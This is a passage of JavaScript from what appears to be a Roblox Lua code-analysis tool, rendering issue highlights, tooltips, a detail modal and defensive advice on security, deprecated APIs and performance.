            const lineNum = parseInt(issue.line) - 1;
            if (lineNum >= 0) {
                if (!issuesByLine[lineNum]) issuesByLine[lineNum] = [];
                issuesByLine[lineNum].push(issue);
            }
        });
        
        Object.entries(issuesByLine).forEach(([lineNum, issues]) => {
            const line = parseInt(lineNum);
            const primaryIssue = getPrimaryIssue(issues);
            const className = getHighlightClass(primaryIssue);
            
            const marker = editor.markText(
                {line: line, ch: 0},
                {line: line, ch: editor.getLine(line)?.length || 0},
                {
                    className: className,
                    title: `${issues.length} issue${issues.length > 1 ? 's' : ''} detected`
                }
            );
            
            issueMarkers.push(marker);
        });
    }

    function getPrimaryIssue(issues) {
        const severityOrder = { 'high': 3, 'medium': 2, 'low': 1 };
        return issues.sort((a, b) => (severityOrder[b.severity] || 0) - (severityOrder[a.severity] || 0))[0];
    }

    function getHighlightClass(issue) {
        if (issue.severity === 'high') return 'issue-critical';
        if (issue.severity === 'medium') return 'issue-warning';
        return `issue-${issue.category}`;
    }

    function addGutterMarkers(allIssues) {
        const issuesByLine = {};
        
        allIssues.forEach(issue => {
            const lineNum = parseInt(issue.line) - 1;
            if (lineNum >= 0) {
                if (!issuesByLine[lineNum]) issuesByLine[lineNum] = [];
                issuesByLine[lineNum].push(issue);
            }
        });
        
        Object.entries(issuesByLine).forEach(([lineNum, issues]) => {
            const line = parseInt(lineNum);
            const primaryIssue = getPrimaryIssue(issues);
            const marker = createGutterMarker(issues, primaryIssue);
            
            editor.setGutterMarker(line, "issue-gutter", marker);
        });
    }

    function createGutterMarker(issues, primaryIssue) {
        const marker = document.createElement('div');
        marker.className = `issue-gutter-marker issue-${primaryIssue.severity}-marker`;
        marker.textContent = issues.length;
        marker.title = `${issues.length} issue${issues.length > 1 ? 's' : ''} on this line`;
        
        return marker;
    }

    function setupEditorInteractions(allIssues) {
        const issuesByLine = {};
        
        allIssues.forEach(issue => {
            const lineNum = parseInt(issue.line) - 1;
            if (lineNum >= 0) {
                if (!issuesByLine[lineNum]) issuesByLine[lineNum] = [];
                issuesByLine[lineNum].push(issue);
            }
        });
        
        editor.on('cursorActivity', () => hideTooltip());
        
        editor.getWrapperElement().addEventListener('mousemove', (e) => {
            const pos = editor.coordsChar({left: e.clientX, top: e.clientY});
            const lineIssues = issuesByLine[pos.line];
            
            if (lineIssues && lineIssues.length > 0) {
                showTooltip(e, pos, lineIssues);
            } else {
                hideTooltip();
            }
        });
        
        editor.getWrapperElement().addEventListener('mouseleave', () => hideTooltip());
        
        editor.getWrapperElement().addEventListener('click', (e) => {
            if (e.target.classList.contains('issue-gutter-marker')) {
                const lineNum = Array.from(e.target.parentNode.parentNode.children).indexOf(e.target.parentNode);
                const lineIssues = issuesByLine[lineNum];
                if (lineIssues) {
                    showDetailedIssuePanel(lineNum + 1, lineIssues);
                }
            }
        });
    }

    function showTooltip(event, pos, issues) {
        hideTooltip();
        
        const primaryIssue = getPrimaryIssue(issues);
        
        issueTooltip = document.createElement('div');
        issueTooltip.className = 'issue-tooltip';
        
        issueTooltip.innerHTML = `
            <div class="tooltip-header">
                <span>${getCategoryIcon(primaryIssue.category)}</span>
                <span class="tooltip-category">${primaryIssue.category}</span>
                <span>Line ${pos.line + 1}</span>
            </div>
            <div class="tooltip-message">${primaryIssue.message}</div>
            ${primaryIssue.suggestion ? `
                <div class="tooltip-suggestion">
                    <div class="tooltip-suggestion-header">💡 Quick Fix:</div>
                    ${primaryIssue.suggestion}
                </div>
            ` : ''}
            ${issues.length > 1 ? `
                <div style="margin-top: 8px; font-size: 12px; color: #a0aec0;">
                    +${issues.length - 1} more issue${issues.length > 2 ? 's' : ''} on this line
                </div>
            ` : ''}
            <div class="tooltip-actions">
                <button class="tooltip-action-btn" onclick="showDetailedIssuePanel(${pos.line + 1}, ${JSON.stringify(issues).replace(/"/g, '&quot;')})">
                    View Details
                </button>
                <button class="tooltip-action-btn" onclick="hideTooltip()">
                    Close
                </button>
            </div>
        `;
        
        document.body.appendChild(issueTooltip);
        
        const rect = issueTooltip.getBoundingClientRect();
        const x = Math.min(event.clientX, window.innerWidth - rect.width - 20);
        const y = event.clientY - rect.height - 15;
        
        issueTooltip.style.left = x + 'px';
        issueTooltip.style.top = Math.max(10, y) + 'px';
    }

    function hideTooltip() {
        if (issueTooltip) {
            issueTooltip.remove();
            issueTooltip = null;
        }
    }

    function showDetailedIssuePanel(lineNumber, issues) {
        hideTooltip();
        
        const modal = createDetailedIssueModal(lineNumber, issues);
        document.body.appendChild(modal);
        
        modal.addEventListener('click', (e) => {
            if (e.target === modal || e.target.classList.contains('modal-close-btn')) {
                modal.remove();
            }
        });
    }

    function createDetailedIssueModal(lineNumber, issues) {
        const modal = document.createElement('div');
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10001;
        `;
        
        const lineContent = editor.getLine(lineNumber - 1) || '';
        
        modal.innerHTML = `
            <div style="
                background: white;
                border-radius: 12px;
                max-width: 700px;
                width: 90%;
                max-height: 80vh;
                overflow-y: auto;
                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            ">
                <div style="
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    padding: 20px;
                    border-radius: 12px 12px 0 0;
                    position: relative;
                ">
                    <h3 style="margin: 0; font-size: 20px;">🔍 Line ${lineNumber} Analysis</h3>
                    <p style="margin: 5px 0 0 0; opacity: 0.9; font-size: 14px;">
                        ${issues.length} issue${issues.length > 1 ? 's' : ''} detected
                    </p>
                    <button class="modal-close-btn" style="
                        position: absolute;
                        top: 15px;
                        right: 15px;
                        background: rgba(255,255,255,0.2);
                        border: none;
                        color: white;
                        width: 30px;
                        height: 30px;
                        border-radius: 50%;
                        cursor: pointer;
                        font-size: 18px;
                    ">×</button>
                </div>
                
                <div style="padding: 20px;">
                    <div style="
                        background: #2d3748;
                        color: #e2e8f0;
                        padding: 15px;
                        border-radius: 8px;
                        font-family: monospace;
                        margin-bottom: 20px;
                        font-size: 14px;
                        overflow-x: auto;
                    ">
                        <div style="color: #a0aec0; font-size: 12px; margin-bottom: 5px;">Line ${lineNumber}:</div>
                        <code>${lineContent}</code>
                    </div>
                    
                    <div style="display: grid; gap: 15px;">
                        ${issues.map((issue, index) => createIssueCard(issue, index)).join('')}
                    </div>
                    
                    <div style="
                        margin-top: 25px;
                        padding: 15px;
                        background: linear-gradient(135deg, #e6fffa 0%, #f0fff4 100%);
                        border-radius: 8px;
                        border: 1px solid #81e6d9;
                    ">
                        <h4 style="color: #2d3748; margin-top: 0;">💡 Overall Recommendations:</h4>
                        ${generateOverallRecommendations(issues)}
                    </div>
                </div>
            </div>
        `;
        
        return modal;
    }

    function createIssueCard(issue, index) {
        const severityColors = {
            'high': '#e53e3e',
            'medium': '#ed8936',
            'low': '#38a169'
        };
        
        const color = severityColors[issue.severity] || '#718096';
        
        return `
            <div style="
                border: 1px solid ${color};
                border-radius: 8px;
                overflow: hidden;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            ">
                <div style="
                    background: ${color};
                    color: white;
                    padding: 12px 15px;
                    font-weight: bold;
                    display: flex;
                    align-items: center;
                    gap: 10px;
                ">
                    <span style="font-size: 18px;">${getCategoryIcon(issue.category)}</span>
                    <span>${issue.category.toUpperCase()} - ${issue.severity.toUpperCase()} PRIORITY</span>
                </div>
                
                <div style="padding: 15px; background: white;">
                    <div style="font-weight: bold; color: #2d3748; margin-bottom: 10px;">
                        ${issue.message}
                    </div>
                    
                    ${issue.suggestion ? `
                        <div style="
                            background: #f7fafc;
                            border-left: 4px solid #4299e1;
                            padding: 12px;
                            margin: 10px 0;
                            border-radius: 0 4px 4px 0;
                        ">
                            <div style="font-weight: bold; color: #2c5282; margin-bottom: 5px;">
                                💡 Recommended Fix:
                            </div>
                            <div style="color: #2d3748;">${issue.suggestion}</div>
                        </div>
                    ` : ''}
                    
                    ${issue.docUrl ? `
                        <div style="margin-top: 10px;">
                            <a href="${issue.docUrl}" target="_blank" style="
                                color: #4299e1;
                                text-decoration: none;
                                font-size: 14px;
                                display: inline-flex;
                                align-items: center;
                                gap: 5px;
                            ">
                                📖 View Documentation →
                            </a>
                        </div>
                    ` : ''}
                    
                    ${generateSpecificAdvice(issue)}
                </div>
            </div>
        `;
    }

    function generateSpecificAdvice(issue) {
        const advice = getAdviceForIssue(issue);
        if (!advice) return '';
        
        return `
            <div style="
                margin-top: 15px;
                padding: 12px;
                background: linear-gradient(135deg, #fef5e7 0%, #fefcbf 100%);
                border-radius: 6px;
                border: 1px solid #f6e05e;
            ">
                <div style="font-weight: bold; color: #744210; margin-bottom: 5px;">
                    🎯 Detailed Advice:
                </div>
                <div style="color: #744210; font-size: 14px;">${advice}</div>
            </div>
        `;
    }

    function getAdviceForIssue(issue) {
        const adviceMap = {
            'security': {
                'remote event/function calls should validate data on server': 'Always validate and sanitize data on the server before processing. Use type checking, range validation, and rate limiting to prevent exploitation.',
                'loadstring': 'Never use loadstring() with user input. If dynamic code execution is necessary, use a whitelist approach with predefined safe functions.',
                'potential sensitive data in string literal': 'Move API keys and sensitive data to server-side configuration files or use Roblox\'s HttpService with proper authentication headers.'
            },
            'deprecation': {
                'global wait() is deprecated': 'task.wait() provides better performance and more accurate timing. It doesn\'t throttle and integrates better with the task scheduler.',
                'global spawn() is deprecated': 'task.spawn() provides guaranteed execution without throttling and better error handling than the deprecated spawn() function.',
                'humanoid:loadanimation() is deprecated': 'Use Animator:LoadAnimation() for better replication control and to avoid client-side only animation issues.'
            },
            'performance': {
                'infinite loop detected': 'Add task.wait() or RunService heartbeat connections in loops to prevent script timeout and maintain 60 FPS.',
                'consider using generic for loops': 'Generic for loops (for k,v in pairs()) are faster for sparse arrays and provide better iteration patterns.',
                'cache game service references': 'Store frequently used services in local variables at script start to avoid repeated GetService() calls.'
            },
            'api': {
                'use workspace instead of game.workspace': 'The global workspace reference is more efficient and cleaner than accessing through game.Workspace.',
                'cache localplayer reference': 'Store game.Players.LocalPlayer in a variable once rather than accessing it repeatedly to improve performance.',
                'health modification should be done on server': 'Client-side health changes can be exploited. Handle health modifications through server scripts and RemoteEvents.'
            }
        };
        
        const categoryAdvice = adviceMap[issue.category];
        if (!categoryAdvice) return null;
        
        for (const key in categoryAdvice) {
            if (issue.message.toLowerCase().includes(key.toLowerCase())) {
                return categoryAdvice[key];
            }
        }
        
        return null;
    }

    function generateOverallRecommendations(issues) {
        const categories = [...new Set(issues.map(i => i.category))];
        const recommendations = [];
        
        if (categories.includes('security')) {
            recommendations.push('🔒 <strong>Security Priority:</strong> Address security issues first as they can lead to exploits');
        }
        if (categories.includes('deprecation')) {
            recommendations.push('⚠️ <strong>Future-Proofing:</strong> Update deprecated APIs to prevent breaking changes');
        }
        if (categories.includes('performance')) {
            recommendations.push('⚡ <strong>Performance:</strong> Optimize these patterns for better game performance');
        }
        
        recommendations.push('📚 <strong>Learning:</strong> Check Roblox Creator documentation for latest best practices');
        recommendations.push('🧪 <strong>Testing:</strong> Test changes in a separate place before deploying to production');
        
        return recommendations.slice(0, 4).map(r => `<div style="margin: 5px 0;">${r}</div>`).join('');
    }
    
    // Make functions globally accessible for onclick handlers
    window.showDetailedIssuePanel = showDetailedIssuePanel;
    window.hideTooltip = hideTooltip;
    
});